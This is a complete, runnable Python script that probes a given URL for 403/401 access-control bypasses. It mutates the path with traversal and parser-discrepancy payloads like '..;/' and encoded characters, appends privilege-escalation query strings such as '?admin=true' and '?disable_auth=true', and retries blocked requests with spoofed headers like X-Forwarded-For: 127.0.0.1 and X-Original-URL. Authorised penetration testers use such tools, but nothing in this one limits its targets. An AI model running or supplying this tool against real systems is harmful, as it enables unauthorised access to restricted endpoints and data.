import requests
import argparse
import sys
import signal
from urllib.parse import urlparse

# Disable SSL warnings
requests.packages.urllib3.disable_warnings()

# Signal Handler for immediate Ctrl+C exit
def signal_handler(sig, frame):
    print("\n\n[!] User interrupted. Shutting down cleanly...")
    sys.exit(0)

signal.signal(signal.SIGINT, signal_handler)

class UltimateBypasser:
    def __init__(self, target_url):
        self.parsed = urlparse(target_url)
        self.base_url = f"{self.parsed.scheme}://{self.parsed.netloc}"
        self.path = self.parsed.path if self.parsed.path else "/"
        self.methods = ["GET", "POST", "PUT", "DELETE", "PATCH", "HEAD", "OPTIONS"]
        self.successes = []
        self.session = requests.Session()
        self.session.verify = False

    def get_path_variations(self):
        """Generates all recursive junction injections, version fuzzing, and encoding."""
        path_str = self.path.strip('/')
        segments = path_str.split('/')
        v = set()
        
        full_path = "/" + path_str
        v.add(full_path)

        # 1. API VERSION FUZZING
        version_payloads = ["v1", "v2", "v3", "v0", "v1.0", "v1.1", "api/v1", "api/v2"]
        for i, seg in enumerate(segments):
            if any(x in seg.lower() for x in ['v1', 'v2', 'v3']):
                for vp in version_payloads:
                    temp_segs = segments.copy()
                    temp_segs[i] = vp
                    v.add("/" + "/".join(temp_segs))

        # 2. RECURSIVE JUNCTION INJECTION (Includes \, .., and ; variations)
        # These exploit Parser Discrepancies between Proxies and Backends
        payloads = [
            "..;/", "..;", ".;/", "./", "//", "/./", "/%2e/", 
            "\\", "..\\", ".\\", "..\\/", "..;\\"
        ]
        for i in range(len(segments) + 1):
            for p in payloads:
                temp_segs = segments.copy()
                temp_segs.insert(i, p)
                joined = ("/" + "/".join(temp_segs)).replace("//", "/")
                v.add(joined)

        # 3. DYNAMIC CHARACTER ENCODING (Per-character)
        for i in range(len(full_path)):
            if full_path[i] == '/': continue
            encoded = f"%{ord(full_path[i]):02x}"
            v.add(full_path[:i] + encoded + full_path[i+1:])

        # 4. START/END CASE MUTATION (e.g., /ApI/V2/VpcS)
        mutated_segments = []
        for seg in segments:
            if len(seg) > 1:
                mutated_segments.append(seg[0].upper() + seg[1:-1] + seg[-1].upper())
            else:
                mutated_segments.append(seg.upper())
        v.add("/" + "/".join(mutated_segments))

        # 5. EXPANDED QUERY PARAMETER BYPASSES
        params = [
            "?debug=true", "?debug=1","debug=yes", "?admin=true", "?admin=1", "?is_admin=true","?user=admin","?verify=false","?format=yaml",
            "?format=txt", "?extend=true", "#extend", "?public=true", "?is_public=true", "public=1", "is_public=1", "?trace=1", "?trace=true",
            "?method=json", "?format=json","?output=json" "?_method=GET", "?_method=POST","?_method=PUT","?privilege=admin","?validate=false",
            "?role=admin", "?env=dev","?env=test","?staging=true", "?bypass=true", "?disable_auth=true", "?show_all=true","?trace=true","?v=1",
            "?version=1.0", "?api_version=v1", "?admin=1%00", "?debug=true%00", "?id=1%00", "?source=127.0.0.1", "?ip=127.0.0.1", "?local=true",
        ]
        for p in params:
            v.add(full_path + p)
        
        # 6. SUFFIX MUTATIONS (Includes trailing \)
        for s in ["/", "/.", "??", "#", ".json", "\\", ".bak", "~"]:
            v.add(full_path + s)
        
        return list(v)

    def get_headers(self):
        """The 19-header Identity and Proxy spoofing matrix."""
        return [
            {"X-Forwarded-For": "127.0.0.1"},
            {"X-Forwarded-Host": "localhost"},
            {"X-Host": "127.0.0.1"},
            {"X-Original-URL": self.path},
            {"X-Rewrite-URL": self.path},
            {"X-Remote-IP": "127.0.0.1"},
            {"X-Client-IP": "127.0.0.1"},
            {"X-Real-IP": "127.0.0.1"},
            {"X-Custom-IP-Authorization": "127.0.0.1"},
            {"X-Originating-IP": "127.0.0.1"},
            {"X-Forwarded-Proto": "http"},
            {"X-Original-Method": "GET"},
            {"X-HTTP-Method-Override": "GET"},
            {"X-Method-Override": "GET"},
            {"X-Forwarded-For": "localhost"},
            {"Referer": self.base_url + self.path},
            {"Content-Type": "application/json"}
        ]

    def run(self):
        print(f"[*] Starting Final Audit: {self.base_url}{self.path}")
        path_variations = self.get_path_variations()
        print(f"[*] Testing {len(path_variations)} total variations per method.")
        print("-" * 100)

        headers_to_test = self.get_headers()

        for method in self.methods:
            for p_var in path_variations:
                full_url = self.base_url + p_var
                try:
                    # Baseline Check
                    res = self.session.request(method, full_url, timeout=3, allow_redirects=False)
                    print(f"Method: {method:<8} | Status_Code: {res.status_code:<5} | Response_length: {len(res.content):<8} | Path: {p_var}")
                    
                    if res.status_code in [200, 201]:
                        self.successes.append(f"SUCCESS: {method} {p_var}")

                    # Header Attack if Blocked
                    if res.status_code in [401, 403, 405]:
                        for h in headers_to_test:
                            h_res = self.session.request(method, full_url, headers=h, timeout=2, allow_redirects=False)
                            if h_res.status_code in [200, 201]:
                                h_name = list(h.keys())[0]
                                print(f"  [!] HEADER BYPASS: {h_name} on {p_var}")
                                self.successes.append(f"HEADER BYPASS: {p_var} via {h_name}")
                except requests.exceptions.RequestException:
                    continue

    def print_summary(self):
        print("\n" + "="*80)
        print("                         FINAL SUCCESS REPORT")
        print("="*80)
        if not self.successes:
            print("[-] No bypasses found. Access is properly restricted.")
        else:
            for report in sorted(set(self.successes)):
                print(f"[+] {report}")
        print("="*80)

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("-u", "--url", required=True)
    args = parser.parse_args()

    auditor = UltimateBypasser(args.url)
    auditor.run()
    auditor.print_summary()
